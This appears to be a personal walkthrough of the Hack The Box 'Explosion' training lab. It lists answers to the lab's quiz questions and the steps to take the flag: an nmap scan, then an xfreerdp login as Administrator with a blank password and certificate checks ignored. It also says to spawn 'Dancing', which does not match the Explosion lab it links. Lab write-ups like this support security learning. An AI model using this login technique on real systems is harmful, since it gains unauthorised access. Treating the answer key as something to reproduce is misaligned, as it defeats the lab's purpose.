## Quick Links
[HTB - Starting Point](https://app.hackthebox.com/starting-point)  
[Explosion Walkthrough](blob:https://app.hackthebox.com/d2c64c04-a1ae-4fad-b22a-47f56e907483) 

## Preparation
1. Connect to the *Starting Point* VPN. See the [[Preparation]] documentation for instructions.
2. Spawn the *Dancing* machine in the *Starting Point* list.
3. Set a variable for the target machine's IP
	1. `export TARGET=<ip_address_of_target>`
	2. `echo $TARGET`
	3. `ping $TARGET` 

## Tasks
1. What does the 3-letter acronym RDP stand for?
	1. *Answer*: Remote Desktop Protocol
2. What is a 3-letter acronym that refers to interaction with the host through a command line interface?
	1. *Answer*: cli
3. What about graphical user interface interactions?
	1. *Answer*: gui
4. What is the name of an old remote access tool that came without encryption by default and listens on TCP port 23?
	1. *Answer*: telnet
5. What is the name of the service running on port 3389 TCP?
	1. *Answer*: ms-wbt-server
6. What is the switch used to specify the target host's IP address when using xfreerdp?
	1. *Answer*: /v:
7. What username successfully returns a desktop projection to us with a blank password?
	1. *Answer*: Administrator
8. Submit root flag
	1. Ping the *$TARGET* machine to verify connection
	2. Run `nmap -sV $TARGET` to scan target
	3. Disconnect from VPN and install *xfreerdp*
		1. Note - if there are issues with dependency versioning, the easiest thing to do is use aptitude to fix it
		2. Install w/o aptitude - `sudo apt-get install freerdp2-x11 -y` 
		3. Install aptitude - `sudo apt-get install aptitude -y` 
		4. Install xfreerdp - `sudo aptitude install freerdp2-x11` 
	4. Attempt to connect to target with *xfreerdp*
		1. `xfreerdp /v:$TARGET /cert:ignore /u:Administrator` 
		2. The password for this account is tested as blank
	5. Upon successful connection, a window opens and logs in. The flag file is on the desktop
	6. Success: Machine Pwned!